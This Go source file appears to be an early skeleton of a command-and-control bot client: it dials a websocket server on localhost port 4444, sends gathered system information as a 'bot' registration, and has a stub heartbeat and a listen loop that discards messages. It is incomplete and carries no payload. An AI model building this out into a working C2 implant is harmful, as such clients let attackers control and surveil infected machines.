package main

import (
	"context"

	"github.com/coder/websocket"
	"github.com/coder/websocket/wsjson"
)

type c2 struct {
	con *websocket.Conn
	ctx context.Context
}

func (c *c2) connectToserver() {
	c.ctx = context.Background()
	var err error

	c.con, _, err = websocket.Dial(c.ctx, "ws://localhost:4444/connect", nil)
	if err != nil {
		return
	}

	bot := getSysInfo()
	wsjson.Write(c.ctx, c.con, bot)

	go c.heartbeat()
	go c.listenToserver()
}

func (c *c2) listenToserver() {
	for {

		wsjson.Read(c.ctx, c.con, nil)
	}
}

func (c *c2) heartbeat() {

}

func main() {
	c := c2{}
	c.connectToserver()
}
